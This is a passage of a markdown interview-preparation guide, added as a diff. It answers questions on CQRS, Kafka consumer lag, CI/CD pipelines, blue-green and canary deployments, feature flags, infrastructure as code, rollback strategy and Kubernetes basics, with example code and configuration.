+  POST /orders   → OrderCommand model → Write DB (normalized, ACID)
+  PUT /orders/42 → OrderCommand model → Write DB
+
+Read side (Queries):
+  GET /orders?userId=1 → OrderQuery model → Read DB (denormalized, optimized for reads)
+  GET /dashboard       → DashboardQuery   → Read DB (pre-aggregated)
+```
+
+**Implementation example:**
+
+```js
+// ── Write side: command handler ────────────────────────────────────────
+class PlaceOrderCommand {
+  constructor({ userId, items, shippingAddress }) {
+    this.userId = userId;
+    this.items = items;
+    this.shippingAddress = shippingAddress;
+  }
+}
+
+class PlaceOrderHandler {
+  async handle(command) {
+    // Validate, enforce business rules
+    const user = await userRepo.findById(command.userId);
+    if (!user.isActive) throw new Error('Inactive user cannot place orders');
+
+    // Write to normalized write DB
+    const order = await orderWriteRepo.create({
+      userId: command.userId,
+      items: command.items,
+      total: calculateTotal(command.items),
+      status: 'pending'
+    });
+
+    // Publish event for read side to update its projection
+    await eventBus.publish('ORDER_PLACED', {
+      orderId:  order.id,
+      userId:   command.userId,
+      items:    command.items,
+      total:    order.total,
+      placedAt: new Date()
+    });
+
+    return order.id;
+  }
+}
+
+// ── Read side: query handler (pre-computed projection) ─────────────────
+// Read DB has a denormalized orders table with user name embedded
+// Updated asynchronously when ORDER_PLACED event arrives
+
+// Event handler updates read model
+eventBus.subscribe('ORDER_PLACED', async (event) => {
+  const user = await userReadRepo.findById(event.userId); // pre-fetched
+
+  // Upsert into read-optimized "order_summaries" table
+  await orderReadRepo.upsert({
+    orderId:      event.orderId,
+    userId:       event.userId,
+    userName:     user.name,        // denormalized — no JOIN needed at query time
+    userEmail:    user.email,       // denormalized
+    total:        event.total,
+    itemCount:    event.items.length,
+    status:       'pending',
+    placedAt:     event.placedAt
+  });
+});
+
+// Query: ultra-fast — no JOINs, pre-computed
+class GetUserOrdersQuery {
+  async execute({ userId, page = 1, limit = 20 }) {
+    return orderReadDB.query(
+      `SELECT order_id, user_name, total, item_count, status, placed_at
+       FROM order_summaries
+       WHERE user_id = $1
+       ORDER BY placed_at DESC
+       LIMIT $2 OFFSET $3`,
+      [userId, limit, (page - 1) * limit]
+    );
+    // No JOINs, denormalized, indexed → extremely fast ✅
+  }
+}
+```
+
+**When CQRS is a good fit:**
+- Read and write workloads have very different scaling needs.
+- Complex domain with many business rules on writes.
+- Need different data shapes for reads vs writes (dashboard vs edit form).
+- Event sourcing (natural CQRS companion).
+
+**When NOT to use it:**
+- Simple CRUD apps — CQRS adds significant complexity.
+- Small teams — maintaining two models is expensive.
+- Data must be immediately consistent — CQRS has eventual consistency between write and read models.
+
+> 📖 Reference: [CQRS — Martin Fowler](https://martinfowler.com/bliki/CQRS.html)
+
+---
+
+**Q17. What is Kafka consumer lag? How do you monitor and fix it?**
+
+**Answer:**
+
+**Consumer lag** is the difference between the latest message in a Kafka partition (the "end offset") and the offset your consumer has processed. Lag = how far behind your consumer is.
+
+```
+Partition 0:
+Produced messages: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]  ← end offset: 9
+Consumer processed: [0, 1, 2, 3, 4, 5]               ← committed offset: 5
+LAG = 9 - 5 = 4 messages behind ⚠️
+```
+
+**Monitoring:**
+
+```bash
+# Kafka built-in CLI
+kafka-consumer-groups.sh \
+  --bootstrap-server kafka:9092 \
+  --describe \
+  --group order-processor
+
+# Output:
+# TOPIC         PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG  CONSUMER-ID
+# order-events  0          1250            1350            100  consumer-1
+# order-events  1          890             890             0    consumer-2
+# order-events  2          1100            1500            400  consumer-3 ⚠️
+
+# Prometheus metric: kafka_consumer_group_lag
+# Alert if lag > threshold (e.g., > 1000 messages or > 5 minutes of lag)
+```
+
+```js
+// Monitor lag programmatically (KafkaJS)
+const admin = kafka.admin();
+await admin.connect();
+
+const offsets = await admin.fetchOffsets({
+  groupId: 'order-processor',
+  topics: ['order-events']
+});
+
+const topicOffsets = await admin.fetchTopicOffsets('order-events');
+
+for (const partitionOffset of offsets.topics[0].partitions) {
+  const { partition, offset: committedOffset } = partitionOffset;
+  const endOffset = topicOffsets.find(t => t.partition === partition).offset;
+  const lag = parseInt(endOffset) - parseInt(committedOffset);
+
+  if (lag > 1000) {
+    await alertOncall(`High consumer lag on partition ${partition}: ${lag} messages`);
+  }
+}
+```
+
+**Fixing consumer lag:**
+
+```js
+// Cause 1: Consumer too slow (processing takes too long)
+// Fix: Increase concurrency within consumer
+const consumer = kafka.consumer({ groupId: 'order-processor' });
+await consumer.run({
+  partitionsConsumedConcurrently: 3,  // process 3 partitions concurrently
+  eachMessage: async ({ message }) => {
+    await processOrderEvent(JSON.parse(message.value.toString()));
+  }
+});
+
+// Cause 2: Not enough consumer instances (more partitions than consumers)
+// Fix: Scale up consumer instances
+// If topic has 6 partitions and you have 2 consumers → add 4 more
+// Each consumer reads 1 partition → 6x parallelism ✅
+
+// Cause 3: Message processing is CPU-bound
+// Fix: Batch process instead of one-by-one
+await consumer.run({
+  eachBatch: async ({ batch }) => {
+    const messages = batch.messages.map(m => JSON.parse(m.value.toString()));
+    await db.query('INSERT INTO events VALUES ...', [messages]); // bulk insert
+    // 1 DB call for 100 messages vs 100 DB calls ✅
+  }
+});
+
+// Cause 4: Topic has too few partitions → can't parallelize enough
+// Fix: Increase partition count (requires rebalancing)
+await admin.createTopics({
+  topics: [{ topic: 'order-events-v2', numPartitions: 12 }] // was 3
+});
+```
+
+> 📖 Reference: [Consumer Lag — Confluent](https://docs.confluent.io/platform/current/kafka/monitoring.html)
+
+---
+
+## 3. CI/CD Pipelines
+
+---
+
+**Q18. What is Continuous Integration (CI)? What does a good CI pipeline include?**
+
+**Answer:**
+
+**Continuous Integration (CI)** is the practice of frequently merging developer code changes into a shared repository where automated builds and tests run on every push — catching integration issues early.
+
+**What a good CI pipeline includes:**
+
+```yaml
+# .github/workflows/ci.yml
+name: CI
+
+on: [push, pull_request]
+
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    services:
+      postgres:
+        image: postgres:15
+        env: { POSTGRES_DB: test, POSTGRES_USER: test, POSTGRES_PASSWORD: test }
+        ports: ['5432:5432']
+      redis:
+        image: redis:7
+        ports: ['6379:6379']
+
+    steps:
+      # 1. Checkout
+      - uses: actions/checkout@v4
+
+      # 2. Setup environment
+      - uses: actions/setup-node@v4
+        with: { node-version: '20', cache: 'npm' }
+
+      # 3. Install dependencies (reproducible)
+      - run: npm ci
+
+      # 4. Lint (code style, formatting)
+      - run: npm run lint
+      # Fails if: console.log left in, unused imports, style violations
+
+      # 5. Type check (TypeScript)
+      - run: npm run typecheck
+      # Catches type errors before runtime
+
+      # 6. Unit tests (fast, isolated)
+      - run: npm run test:unit -- --coverage
+      # Must pass, coverage > 80%
+
+      # 7. Integration tests (real DB, real Redis)
+      - run: npm run test:integration
+        env:
+          DATABASE_URL: postgres://test:test@localhost:5432/test
+          REDIS_URL:    redis://localhost:6379
+
+      # 8. Security audit
+      - run: npm audit --audit-level=high
+      # Fails if HIGH or CRITICAL vulnerabilities found
+
+      # 9. Build (compile TypeScript, bundle)
+      - run: npm run build
+      # Catches compile errors
+
+      # 10. Docker build (catches Dockerfile issues)
+      - run: docker build -t my-app:${{ github.sha }} .
+
+      # 11. Push (only on main branch merges)
+      - if: github.ref == 'refs/heads/main'
+        run: |
+          docker push registry.io/my-app:${{ github.sha }}
+          docker push registry.io/my-app:latest
+```
+
+**Golden rule of CI:** The pipeline should be fast (< 10 minutes) and reliable. Flaky tests erode trust in CI.
+
+> 📖 Reference: [CI — Martin Fowler](https://martinfowler.com/articles/continuousIntegration.html)
+
+---
+
+**Q19. What is Continuous Delivery vs Continuous Deployment? What is the difference?**
+
+**Answer:**
+
+```
+Continuous Integration (CI):
+  Code → Automated tests → Build artifact
+  Always: every push is tested automatically
+
+Continuous Delivery (CD):
+  CI + Automated release to staging
+  Artifact is READY to deploy to production
+  Manual approval required for production deploy
+  "We COULD deploy anytime, but a human clicks the button"
+
+Continuous Deployment (CD):
+  CI + Automatic deploy to PRODUCTION
+  Every passing commit goes live automatically
+  No human approval — fully automated
+  "If tests pass, it's live"
+```
+
+```
+           Push     CI passes    Manual approval   Deploy to prod
+Dev ──────► CI ───►  ✅        ──────────────────► Production
+                                 ^
+                                 |
+                      Continuous Delivery stops here (human decides)
+
+           Push     CI passes                      Auto deploy to prod
+Dev ──────► CI ───►  ✅  ────────────────────────► Production
+                                                    ^
+                                                    |
+                         Continuous Deployment (fully automated)
+```
+
+**In practice:**
+
+```yaml
+# Continuous Delivery: manual production approval gate
+jobs:
+  deploy-staging:
+    needs: ci
+    runs-on: ubuntu-latest
+    steps:
+      - run: kubectl set image deployment/api api=my-app:${{ github.sha }} -n staging
+
+  deploy-production:
+    needs: deploy-staging
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://api.myapp.com
+    # 'environment: production' requires manual approval in GitHub ✅
+    steps:
+      - run: kubectl set image deployment/api api=my-app:${{ github.sha }} -n production
+
+# Continuous Deployment: no approval gate, auto-deploy to prod
+  deploy-production:
+    needs: [ci, deploy-staging, run-smoke-tests]
+    if: github.ref == 'refs/heads/main'
+    # No environment approval required — deploys automatically
+    steps:
+      - run: kubectl set image deployment/api api=my-app:${{ github.sha }} -n production
+```
+
+**Which to choose:**
+- **Continuous Delivery:** regulated industries (finance, healthcare), complex deployments, when manual QA is required.
+- **Continuous Deployment:** high-confidence test suite, small/frequent changes, teams that do multiple deploys per day (Netflix, Amazon).
+
+> 📖 Reference: [CD vs CD — Atlassian](https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vs-deployment)
+
+---
+
+**Q20. What is a blue-green deployment? What are its advantages?**
+
+**Answer:**
+
+**Blue-green deployment** maintains two identical production environments (blue = current live, green = new version). Traffic is switched from blue to green all at once when the new version is ready.
+
+```
+Normal state:
+Load Balancer → Blue (v1.0) ← 100% traffic
+                Green (idle)
+
+Deploying v1.1:
+1. Deploy v1.1 to Green (blue still serves all traffic)
+2. Run smoke tests on Green
+3. Switch LB: Blue → Green (instant traffic switch)
+Load Balancer → Blue (v1.0) ← 0% traffic (kept for rollback)
+                Green (v1.1) ← 100% traffic
+
+If problem detected:
+4. Rollback: switch LB back to Blue (instant!)
+Load Balancer → Blue (v1.0) ← 100% traffic
+                Green (v1.1) ← 0% (can redeploy)
+```
+
+**Implementation:**
+
+```bash
+# Kubernetes blue-green deployment
+
+# Blue deployment (current production)
+kubectl apply -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api-blue
+spec:
+  replicas: 5
+  selector:
+    matchLabels: { app: api, version: blue }
+  template:
+    metadata:
+      labels: { app: api, version: blue }
+    spec:
+      containers:
+      - name: api
+        image: my-app:1.0.0
+EOF
+
+# Service pointing to blue
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: api-service
+spec:
+  selector:
+    app: api
+    version: blue    # ← points to blue
+  ports: [{ port: 80, targetPort: 3000 }]
+EOF
+
+# Deploy new version to green (blue still serves traffic)
+kubectl apply -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api-green
+spec:
+  replicas: 5
+  template:
+    metadata:
+      labels: { app: api, version: green }
+    spec:
+      containers:
+      - name: api
+        image: my-app:1.1.0   # ← new version
+EOF
+
+# Run smoke tests against green directly
+kubectl port-forward deployment/api-green 3001:3000
+curl http://localhost:3001/health
+
+# Switch traffic to green (zero downtime!)
+kubectl patch service api-service -p '{"spec":{"selector":{"version":"green"}}}'
+
+# Rollback if needed (instant!)
+kubectl patch service api-service -p '{"spec":{"selector":{"version":"blue"}}}'
+```
+
+**Advantages:**
+- Zero-downtime deployment (traffic switch is instant).
+- Instant rollback (just switch back to blue).
+- Green environment fully tested before receiving traffic.
+- Reduces deployment risk significantly.
+
+**Disadvantage:** Requires 2x infrastructure cost (two full environments running simultaneously).
+
+> 📖 Reference: [Blue-Green Deployment — Martin Fowler](https://martinfowler.com/bliki/BlueGreenDeployment.html)
+
+---
+
+**Q21. What is a canary deployment? How does it reduce deployment risk?**
+
+**Answer:**
+
+**Canary deployment** gradually rolls out a new version to a small percentage of users first. If metrics look healthy, the rollout continues. If not, roll back — affecting only the small canary group.
+
+```
+Phase 1: 5% of traffic → v1.1 (canary)
+         95% of traffic → v1.0 (stable)
+         Monitor: error rate, latency, business metrics
+
+Phase 2: 25% → v1.1, 75% → v1.0 (if healthy)
+Phase 3: 50% → v1.1, 50% → v1.0
+Phase 4: 100% → v1.1 (full rollout complete)
+         Decommission v1.0
+
+Rollback at any phase: set canary weight back to 0% instantly
+```
+
+**Kubernetes + Argo Rollouts:**
+
+```yaml
+# argo-rollout.yaml — automated canary with metrics analysis
+apiVersion: argoproj.io/v1alpha1
+kind: Rollout
+metadata:
+  name: api-rollout
+spec:
+  replicas: 10
+  strategy:
+    canary:
+      steps:
+      - setWeight: 5          # 5% of traffic to canary
+      - pause: { duration: 5m }  # wait 5 minutes
+      - analysis:             # automated health check
+          templates:
+          - templateName: success-rate
+          args:
+          - name: service-name
+            value: api-canary
+      - setWeight: 25         # if analysis passes, increase to 25%
+      - pause: { duration: 10m }
+      - setWeight: 50
+      - pause: { duration: 10m }
+      - setWeight: 100        # full rollout
+  template:
+    spec:
+      containers:
+      - name: api
+        image: my-app:{{.NewVersion}}
+```
+
+```yaml
+# Analysis template — auto-rollback if error rate spikes
+apiVersion: argoproj.io/v1alpha1
+kind: AnalysisTemplate
+metadata:
+  name: success-rate
+spec:
+  metrics:
+  - name: success-rate
+    interval: 1m
+    successCondition: result[0] >= 0.95    # 95% success rate required
+    failureLimit: 3
+    provider:
+      prometheus:
+        address: http://prometheus:9090
+        query: |
+          sum(rate(http_requests_total{job="api", status!~"5.."}[1m]))
+          /
+          sum(rate(http_requests_total{job="api"}[1m]))
+# If success rate drops below 95%, auto-rollback triggers!
+```
+
+**Canary vs Blue-Green:**
+- Canary: gradual rollout, real user traffic validates, smaller blast radius.
+- Blue-Green: instant full switch, full parallel environment, easier to manage.
+
+> 📖 Reference: [Canary Deployment — Martin Fowler](https://martinfowler.com/bliki/CanaryRelease.html)
+
+---
+
+**Q22. What is a feature flag (feature toggle)? How does it decouple deployment from release?**
+
+**Answer:**
+
+A **feature flag** (toggle) is a conditional that controls whether a feature is active — independently of whether the code is deployed. You deploy code with the flag OFF, then turn it ON when ready.
+
+```
+Without feature flags:
+Code ready → must wait for "release" meeting → deploy + release together
+"Big bang" release: all or nothing, no gradual rollout
+
+With feature flags:
+Code ready → deploy (flag OFF) → production has new code but feature is invisible
+→ Turn flag ON for 5% of users → monitor
+→ Turn ON for 50% → full release
+→ If problem: turn flag OFF instantly (no redeploy needed!)
+```
+
+**Types of flags:**
+
+```js
+const { LaunchDarkly } = require('@launchdarkly/node-server-sdk');
+const ldClient = LaunchDarkly.init(process.env.LAUNCHDARKLY_SDK_KEY);
+
+// 1. Release toggle — control feature rollout
+app.get('/dashboard', requireAuth, async (req, res) => {
+  const useNewDashboard = await ldClient.variation(
+    'new-dashboard-v2',
+    { key: req.user.id, email: req.user.email },
+    false  // default (off)
+  );
+
+  if (useNewDashboard) {
+    return res.json(await newDashboardService.getData(req.user.id));
+  } else {
+    return res.json(await legacyDashboardService.getData(req.user.id));
+  }
+});
+
+// 2. Ops toggle — emergency kill switch
+app.post('/payments', requireAuth, async (req, res) => {
+  const paymentsEnabled = await ldClient.variation('payments-enabled', {}, true);
+
+  if (!paymentsEnabled) {
+    return res.status(503).json({
+      error: 'Payments temporarily unavailable. Please try again later.'
+    });
+  }
+
+  // Process payment...
+});
+
+// 3. Experiment toggle — A/B testing
+app.get('/checkout', requireAuth, async (req, res) => {
+  const checkoutVariant = await ldClient.variation(
+    'checkout-experiment',
+    { key: req.user.id },
+    'control'   // 'control', 'variant-a', 'variant-b'
+  );
+
+  const checkout = await checkoutService.getCheckout(req.user.id, checkoutVariant);
+  res.json({ ...checkout, variant: checkoutVariant }); // log variant for analytics
+});
+
+// 4. Permission toggle — specific users/accounts
+const betaAccess = await ldClient.variation('beta-feature', {
+  key: req.user.id,
+  custom: { plan: req.user.plan, company: req.user.companyId }
+}, false);
+// Can target: enterprise users, specific companies, internal employees, beta testers
+```
+
+**Simple in-house implementation:**
+
+```js
+// Redis-backed feature flags (no external dependency)
+class FeatureFlags {
+  async isEnabled(flagName, userId = null) {
+    const flag = await redis.hgetall(`flag:${flagName}`);
+    if (!flag) return false;
+    if (flag.enabled === 'false') return false;
+    if (flag.percentage) {
+      // Hash user ID to consistent percentage (0-100)
+      const hash = parseInt(crypto.createHash('md5').update(`${flagName}:${userId}`).digest('hex').slice(0, 8), 16);
+      return (hash % 100) < parseInt(flag.percentage);
+    }
+    return true;
+  }
+
+  async setFlag(name, { enabled, percentage }) {
+    await redis.hmset(`flag:${name}`, { enabled: enabled.toString(), percentage: percentage || 100 });
+  }
+}
+```
+
+> 📖 Reference: [Feature Toggles — Martin Fowler](https://martinfowler.com/articles/feature-toggles.html)
+
+---
+
+**Q23. What is Infrastructure as Code (IaC)? Name two tools used for it.**
+
+**Answer:**
+
+**Infrastructure as Code (IaC)** means defining and managing infrastructure (servers, databases, networks, load balancers) using code files — not manual clicks in a UI. Infrastructure becomes versioned, reproducible, and automated.
+
+**Without IaC:**
+- Click through AWS console to create an RDS instance.
+- Write down the settings somewhere.
+- Hope someone remembers what was configured when you need to recreate it.
+- Manually repeat for staging, production, disaster recovery.
+
+**With IaC:**
+```bash
+# One command to create identical infrastructure in any environment
+terraform apply -var="env=production"
+# Creates: VPC, subnets, RDS, Redis, ECS cluster, load balancer, security groups
+# Idempotent: run again = no change (already exists)
+# Version control: track every infrastructure change in git
+```
+
+**Tool 1: Terraform (HCL — declarative)**
+
+```hcl
+# infrastructure/rds.tf
+resource "aws_db_instance" "main" {
+  identifier        = "myapp-${var.environment}"
+  engine            = "postgres"
+  engine_version    = "15.4"
+  instance_class    = var.environment == "production" ? "db.r6g.xlarge" : "db.t3.medium"
+  allocated_storage = 100
+  db_name           = "myapp"
+  username          = "app"
+  password          = var.db_password   # from secrets
+
+  vpc_security_group_ids = [aws_security_group.db.id]
+  db_subnet_group_name   = aws_db_subnet_group.main.name
+
+  backup_retention_period = 7
+  deletion_protection     = var.environment == "production"
+
+  tags = { Environment = var.environment, ManagedBy = "terraform" }
+}
+
+output "db_endpoint" {
+  value = aws_db_instance.main.endpoint
+}
+```
+
+```bash
+terraform plan    # preview changes
+terraform apply   # apply changes
+terraform destroy # tear down (use with caution!)
+```
+
+**Tool 2: AWS CDK (Python/TypeScript — imperative)**
+
+```typescript
+// infrastructure/stack.ts
+import * as cdk from 'aws-cdk-lib';
+import * as rds from 'aws-cdk-lib/aws-rds';
+import * as ec2 from 'aws-cdk-lib/aws-ec2';
+
+export class AppStack extends cdk.Stack {
+  constructor(scope: cdk.App, id: string, props: cdk.StackProps) {
+    super(scope, id, props);
+
+    const vpc = new ec2.Vpc(this, 'AppVpc', { maxAzs: 3 });
+
+    const database = new rds.DatabaseInstance(this, 'AppDB', {
+      engine: rds.DatabaseInstanceEngine.postgres({ version: rds.PostgresEngineVersion.VER_15_4 }),
+      instanceType: ec2.InstanceType.of(ec2.InstanceClass.R6G, ec2.InstanceSize.XLARGE),
+      vpc,
+      multiAz: true,
+      backupRetention: cdk.Duration.days(7),
+    });
+  }
+}
+```
+
+> 📖 Reference: [IaC — HashiCorp](https://www.hashicorp.com/resources/what-is-infrastructure-as-code)
+
+---
+
+**Q24. What is a rollback strategy in deployments? How do you design for it?**
+
+**Answer:**
+
+A **rollback strategy** defines how to revert to the previous version when a deployment causes problems. Fast, reliable rollback is as important as the deployment itself.
+
+**Rollback strategies by deployment type:**
+
+```bash
+# ── Kubernetes: immediate rollback ────────────────────────────────────
+kubectl rollout undo deployment/api
+# Reverts to previous ReplicaSet (keeps history by default)
+
+kubectl rollout history deployment/api
+# REVISION  CHANGE-CAUSE
+# 1         Initial deployment v1.0
+# 2         Update to v1.1
+# 3         Update to v1.2 ← current (problematic)
+
+kubectl rollout undo deployment/api --to-revision=2  # roll back to v1.1
+# Kubernetes starts old pods, terminates new ones (rolling)
+
+# ── Blue-green: instant traffic switch ───────────────────────────────
+kubectl patch service api-service -p '{"spec":{"selector":{"version":"blue"}}}'
+# Traffic immediately returns to blue (old version)
+# Green stays running temporarily for analysis
+
+# ── Database: the hardest part ────────────────────────────────────────
+# Code rollback is easy. DB schema rollback is hard.
+
+# ❌ Bad migration (irreversible):
+ALTER TABLE users DROP COLUMN phone_number;
+# If you roll back the code, old code expects phone_number → crashes!
+
+# ✅ Good migration (expand-contract / backward-compatible):
+-- Deploy step 1: Add new column (old code ignores it, new code uses it)
+ALTER TABLE users ADD COLUMN phone_number VARCHAR(20);
+
+-- Deploy step 2: new code writes to BOTH old and new columns
+
+-- Deploy step 3: backfill, then drop old column
+-- If you rollback between steps 1-2: no problem, old code runs fine
+
+# ✅ Never make column NOT NULL in same migration as adding it:
+-- ❌ This breaks rollback:
+ALTER TABLE orders ADD COLUMN currency VARCHAR(3) NOT NULL DEFAULT 'USD';
+
+-- ✅ Do it in steps:
+-- Step 1: Add nullable
+ALTER TABLE orders ADD COLUMN currency VARCHAR(3) DEFAULT 'USD';
+-- Step 2: Backfill existing rows
+UPDATE orders SET currency = 'USD' WHERE currency IS NULL;
+-- Step 3 (later): Make NOT NULL
+ALTER TABLE orders ALTER COLUMN currency SET NOT NULL;
+```
+
+**Automated rollback triggers:**
+
+```yaml
+# Argo Rollouts: auto-rollback on error rate spike
+analysis:
+  metrics:
+  - name: error-rate
+    interval: 30s
+    failureCondition: result[0] > 0.05   # auto-rollback if error rate > 5%
+    provider:
+      prometheus:
+        query: rate(http_requests_total{status=~"5.."}[1m]) / rate(http_requests_total[1m])
+```
+
+> 📖 Reference: [Rollback Strategies — Google SRE Book](https://sre.google/sre-book/release-engineering/)
+
+---
+
+## 4. Kubernetes Basics
+
+---
+
+**Q25. What is Kubernetes? What problem does it solve that Docker alone doesn't?**
+
+**Answer:**
+
+**Docker** packages apps into containers. **Kubernetes (K8s)** orchestrates those containers at scale — scheduling, healing, scaling, and networking them across a cluster of machines.
+
+```
+Docker alone:
+- Run a container on ONE machine: docker run my-app
+- Container crashes → stays dead (you must restart manually)
+- Need more capacity → manually SSH, docker run more
+- No load balancing, no service discovery, no rolling updates
+- Works for 1 container. Fails for 100 containers across 10 servers.
+
+Kubernetes:
+- Schedules containers across a CLUSTER of nodes
+- Container crashes → K8s restarts it automatically (self-healing)
+- CPU too high → K8s adds more pods (autoscaling)
+- Deploy new version → K8s rolls it out without downtime
+- Service discovery built-in (DNS for every service)
+- Secret management, config management, volume management
+```
+
+**Docker vs Kubernetes comparison:**
+
+| | Docker | Kubernetes |
+|--|--------|-----------|
+| Runs on | 1 machine | Cluster of machines |
+| Self-healing | ❌ Manual restart | ✅ Automatic pod restart |
+| Scaling | ❌ Manual | ✅ HPA autoscales on CPU/memory |
+| Load balancing | ❌ Need NGINX manually | ✅ Built-in Service abstraction |
+| Rolling updates | ❌ Manual | ✅ Deployment rolling update |
+| Service discovery | ❌ None | ✅ DNS-based (service-name.namespace) |
+| Config management | Manual env files | ConfigMaps + Secrets |
+| Storage | Volumes per container | PersistentVolumes across cluster |
+
+> 📖 Reference: [Kubernetes Overview — Kubernetes Docs](https://kubernetes.io/docs/concepts/overview/)
+
+---
+
+**Q26. What are Pods, Deployments, and Services in Kubernetes?**
+
+**Answer:**
+
+**Pod:** The smallest deployable unit. A pod wraps one or more containers that share network and storage. You almost never create pods directly — Deployments manage them.
+
+**Deployment:** Manages a set of identical pods. Handles rolling updates, scaling, and self-healing.
+
+**Service:** Stable network endpoint that load-balances traffic to pods. Pods come and go; Service provides a consistent DNS name and IP.
+
+```yaml
+# ── Pod (rarely created directly) ─────────────────────────────────────
+apiVersion: v1
+kind: Pod
+metadata:
+  name: my-api-pod
+spec:
+  containers:
+  - name: api
+    image: my-app:1.0
+    ports: [{ containerPort: 3000 }]
+
+# ── Deployment (use this instead of raw pods) ──────────────────────────
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api
+spec:
+  replicas: 3                    # keep 3 pods running at all times
+  selector:
+    matchLabels: { app: api }
+  strategy:
+    type: RollingUpdate
+    rollingUpdate:
+      maxUnavailable: 1          # at most 1 pod down during update
+      maxSurge:       1          # at most 1 extra pod during update
+  template:
+    metadata:
+      labels: { app: api }
+    spec:
+      containers:
+      - name: api
+        image: my-app:1.0
+        ports: [{ containerPort: 3000 }]
+        resources:
+          requests: { cpu: "100m", memory: "256Mi" }
+          limits:   { cpu: "500m", memory: "512Mi" }
+        readinessProbe:
+          httpGet: { path: /health, port: 3000 }
+          initialDelaySeconds: 5
+          periodSeconds: 10
+
+# ── Service (stable endpoint to reach pods) ────────────────────────────
+apiVersion: v1
+kind: Service
+metadata:
+  name: api-service
+spec:
+  selector: { app: api }         # routes to pods with label app=api
+  ports:
+  - port: 80
+    targetPort: 3000
+  type: ClusterIP                # internal only
+
+# Other service types:
+# type: LoadBalancer   → external AWS/GCP load balancer (internet-facing)
+# type: NodePort       → expose on each node's IP:port (dev use)
+# type: ClusterIP      → internal cluster traffic only (default)
+```
+
+```bash
+# Operations
+kubectl get pods              # list running pods
+kubectl get deployments       # list deployments
+kubectl get services          # list services
+kubectl describe pod api-xyz  # detailed info + events
+
+kubectl scale deployment api --replicas=10  # scale to 10 pods
+kubectl set image deployment/api api=my-app:1.1  # rolling update
+
+# Access service from within cluster:
+# http://api-service.default.svc.cluster.local:80
+# Or just: http://api-service (within same namespace)
+```
+
+> 📖 Reference: [Kubernetes Workloads — Kubernetes Docs](https://kubernetes.io/docs/concepts/workloads/)
+
+---
+
+**Q27. What is a Kubernetes ConfigMap vs a Secret?**
+
+**Answer:**
+
+| | ConfigMap | Secret |
+|--|-----------|--------|
+| Purpose | Non-sensitive configuration | Sensitive data (passwords, keys, certs) |
+| Encoding | Plain text | Base64 encoded (NOT encrypted by default) |
+| Access | Env vars, volume mounts, CLI | Same, but access controlled by RBAC |
+| Example | App log level, feature flags, DB host | DB password, API keys, TLS certificates |
+
+```yaml
+# ── ConfigMap ─────────────────────────────────────────────────────────
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app-config
+data:
+  LOG_LEVEL:    "info"
+  PORT:         "3000"
+  DB_HOST:      "postgres.default.svc.cluster.local"
+  DB_PORT:      "5432"
+  CACHE_TTL:    "300"
+  APP_ENV:      "production"
+
+# ── Secret ────────────────────────────────────────────────────────────
+apiVersion: v1
+kind: Secret
+metadata:
+  name: app-secrets
+type: Opaque
+data:
+  # Values must be base64-encoded
+  # echo -n 'mysecretpassword' | base64
+  DB_PASSWORD:    bXlzZWNyZXRwYXNzd29yZA==
+  JWT_SECRET:     c3VwZXJzZWNyZXRrZXkxMjM=
+  STRIPE_API_KEY: c2tfdGVzdF94eHh4eHg=
+
+# ── Use in Deployment ─────────────────────────────────────────────────
+spec:
+  containers:
+  - name: api
+    image: my-app:1.0
+    envFrom:
+    - configMapRef:
+        name: app-config          # load all ConfigMap entries as env vars
+    - secretRef:
+        name: app-secrets         # load all Secret entries as env vars
+    # Or individually:
+    env:
+    - name: DB_PASSWORD
+      valueFrom:
+        secretKeyRef:
+          name: app-secrets
+          key: DB_PASSWORD
+```
+
+```bash
+# Create from files (don't commit secrets to git!)
+kubectl create secret generic app-secrets \
+  --from-literal=DB_PASSWORD=mysecretpassword \
+  --from-literal=JWT_SECRET=supersecretkey
+
+# Or from a .env file
+kubectl create secret generic app-secrets --from-env-file=.env.production
+
+# In production: use external secret manager (AWS Secrets Manager + External Secrets Operator)
+# Syncs secrets from AWS → Kubernetes Secret automatically
+```
+
+> 📖 Reference: [ConfigMaps and Secrets — Kubernetes Docs](https://kubernetes.io/docs/concepts/configuration/)
+
+---
+
+**Q28. What is horizontal pod autoscaling (HPA) in Kubernetes?**
+
+**Answer:**
+
+**HPA** automatically scales the number of pod replicas based on observed CPU utilization, memory, or custom metrics (like requests per second, Kafka consumer lag).
+
+```
+Normal load: 3 pods at 30% CPU each
+Traffic spike: CPU rises to 80%
+HPA: "Above 50% CPU threshold → scale up"
+HPA scales to 6 pods → CPU drops to 40% ✅
+
+Traffic drops:
+CPU at 10% per pod
+HPA: "Below threshold → scale down"
+HPA scales back to 3 pods → cost optimized ✅
+```
+
+```yaml
+# ── HPA based on CPU ──────────────────────────────────────────────────
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: api-hpa
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: api
+  minReplicas: 3
+  maxReplicas: 20
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 50   # scale when avg CPU > 50%
+
+# ── HPA based on memory ───────────────────────────────────────────────
+  - type: Resource
+    resource:
+      name: memory
+      target:
+        type: AverageValue
+        averageValue: 400Mi     # scale when avg memory > 400Mi
+
+# ── HPA based on custom metric (requests per second) ──────────────────
+  - type: Pods
+    pods:
+      metric:
+        name: http_requests_per_second
+      target:
+        type: AverageValue
+        averageValue: "100"     # scale when avg RPS per pod > 100
+
+# ── HPA based on Kafka consumer lag (KEDA) ────────────────────────────
+# KEDA extends HPA with external metrics
+apiVersion: keda.sh/v1alpha1
+kind: ScaledObject
+metadata:
+  name: kafka-consumer-scaler
+spec:
+  scaleTargetRef:
+    name: order-processor
+  minReplicaCount: 1
+  maxReplicaCount: 30
+  triggers:
+  - type: kafka
+    metadata:
+      bootstrapServers: kafka:9092
+      consumerGroup:    order-processor
+      topic:            order-events
+      lagThreshold:     "100"   # 1 pod per 100 lagging messages
+```
+
+```bash
+kubectl get hpa
